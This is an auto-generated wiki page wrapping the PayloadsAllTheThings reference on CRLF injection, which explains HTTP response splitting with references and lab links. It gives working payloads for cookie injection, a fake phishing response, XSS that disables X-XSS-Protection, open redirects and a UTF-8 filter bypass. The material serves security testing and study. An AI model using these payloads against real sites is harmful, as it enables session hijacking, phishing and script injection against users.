---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Carriage Return Line Feed

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-crlf-injection-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/CRLF Injection/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Carriage Return Line Feed](../../topics/crlf-injection/carriage-return-line-feed.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-crlf-injection-readme |
| name | Carriage Return Line Feed |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CRLF%20Injection/README.md |

## Preserved Source Material

````yaml
_body: "# Carriage Return Line Feed\n\n> CRLF Injection is a web security vulnerability that arises when an attacker injects\
  \ unexpected Carriage Return (CR) (\\r) and Line Feed (LF) (\\n) characters into an application. These characters are used\
  \ to signify the end of a line and the start of a new one in network protocols like HTTP, SMTP, and others. In the HTTP\
  \ protocol, the CR-LF sequence is always used to terminate a line.\n\n## Summary\n\n* [Methodology](#methodology)\n    *\
  \ [Session Fixation](#session-fixation)\n    * [Cross Site Scripting](#cross-site-scripting)\n    * [Open Redirect](#open-redirect)\n\
  * [Filter Bypass](#filter-bypass)\n* [Labs](#labs)\n* [References](#references)\n\n## Methodology\n\nHTTP Response Splitting\
  \ is a security vulnerability where an attacker manipulates an HTTP response by injecting Carriage Return (CR) and Line\
  \ Feed (LF) characters (collectively called CRLF) into a response header. These characters mark the end of a header and\
  \ the start of a new line in HTTP responses.\n\n**CRLF Characters**:\n\n* `CR` (`\\r`, ASCII 13): Moves the cursor to the\
  \ beginning of the line.\n* `LF` (`\\n`, ASCII 10): Moves the cursor to the next line.\n\nBy injecting a CRLF sequence,\
  \ the attacker can break the response into two parts, effectively controlling the structure of the HTTP response. This can\
  \ result in various security issues, such as:\n\n* Cross-Site Scripting (XSS): Injecting malicious scripts into the second\
  \ response.\n* Cache Poisoning: Forcing incorrect content to be stored in caches.\n* Header Manipulation: Altering headers\
  \ to mislead users or systems\n\n### Session Fixation\n\nA typical HTTP response header looks like this:\n\n```http\nHTTP/1.1\
  \ 200 OK\nContent-Type: text/html\nSet-Cookie: sessionid=abc123\n```\n\nIf user input `value\\r\\nSet-Cookie: admin=true`\
  \ is embedded into the headers without sanitization:\n\n```http\nHTTP/1.1 200 OK\nContent-Type: text/html\nSet-Cookie: sessionid=value\n\
  Set-Cookie: admin=true\n```\n\nNow the attacker has set their own cookie.\n\n### Cross Site Scripting\n\nBeside the session\
  \ fixation that requires a very insecure way of handling user session, the easiest way to exploit a CRLF injection is to\
  \ write a new body for the page. It can be used to create a phishing page or to trigger an arbitrary Javascript code (XSS).\n\
  \n**Requested page**:\n\n```http\nhttp://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E\n\
  ```\n\n**HTTP response**:\n\n```http\nSet-Cookie:en\nContent-Length: 0\n\nHTTP/1.1 200 OK\nContent-Type: text/html\nLast-Modified:\
  \ Mon, 27 Oct 2060 14:50:18 GMT\nContent-Length: 34\n\n<html>You have been Phished</html>\n```\n\nIn the case of an XSS,\
  \ the CRLF injection allows to inject the `X-XSS-Protection` header with the value value \"0\", to disable it. And then\
  \ we can add our HTML tag containing Javascript code .\n\n**Requested page**:\n\n```powershell\nhttp://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e\n\
  ```\n\n**HTTP Response**:\n\n```http\nHTTP/1.1 200 OK\nDate: Tue, 20 Dec 2016 14:34:03 GMT\nContent-Type: text/html; charset=utf-8\n\
  Content-Length: 22907\nConnection: close\nX-Frame-Options: SAMEORIGIN\nLast-Modified: Tue, 20 Dec 2016 11:50:50 GMT\nETag:\
  \ \"842fe-597b-54415a5c97a80\"\nVary: Accept-Encoding\nX-UA-Compatible: IE=edge\nServer: NetDNA-cache/2.2\nLink: https://example.com/[INJECTION\
  \ STARTS HERE]\nContent-Length:35\nX-XSS-Protection:0\n\n23\n<svg onload=alert(document.domain)>\n0\n```\n\n### Open Redirect\n\
  \nInject a `Location` header to force a redirect for the user.\n\n```ps1\n%0d%0aLocation:%20http://myweb.com\n```\n\n##\
  \ Filter Bypass\n\n[RFC 7230](https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4) states that most HTTP header\
  \ field values use only a subset of the US-ASCII charset.\n\n> Newly defined header fields SHOULD limit their field values\
  \ to US-ASCII octets.\n\nFirefox followed the spec by stripping off any out-of-range characters when setting cookies instead\
  \ of encoding them.\n\n| UTF-8 Character | Hex | Unicode | Stripped |\n| --------- | --- | ------- | -------- |\n| `嘊` |\
  \ `%E5%98%8A` | `\\u560a` | `%0A` (\\n) |\n| `嘍` | `%E5%98%8D` | `\\u560d` | `%0D` (\\r) |\n| `嘾` | `%E5%98%BE` | `\\u563e`\
  \ | `%3E` (>)  |\n| `嘼` | `%E5%98%BC` | `\\u563c` | `%3C` (<)  |\n\nThe UTF-8 character `嘊` contains `0a` in the last part\
  \ of its hex format, which would be converted as `\\n` by Firefox.\n\nAn example payload using UTF-8 characters would be:\n\
  \n```js\n嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain()嘾\n```\n\nURL encoded version\n\n```js\n\
  %E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE\n\
  ```\n\n## Labs\n\n* [PortSwigger - HTTP/2 request splitting via CRLF injection](https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-splitting-via-crlf-injection)\n\
  * [Root Me - CRLF](https://www.root-me.org/en/Challenges/Web-Server/CRLF)\n\n## References\n\n* [CRLF Injection - CWE-93\
  \ - OWASP - May 20, 2022](https://web.archive.org/web/20200113055606/https://www.owasp.org/index.php/CRLF_Injection)\n*\
  \ [CRLF injection on Twitter or why blacklists fail - XSS Jigsaw - April 21, 2015](https://web.archive.org/web/20150425024348/https://blog.innerht.ml/twitter-crlf-injection/)\n\
  * [Starbucks: [newscdn.starbucks.com] CRLF Injection, XSS - Bobrov - December 20, 2016](https://vulners.com/hackerone/H1:192749)"
_relative_path: CRLF Injection/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/CRLF Injection/README.md
````
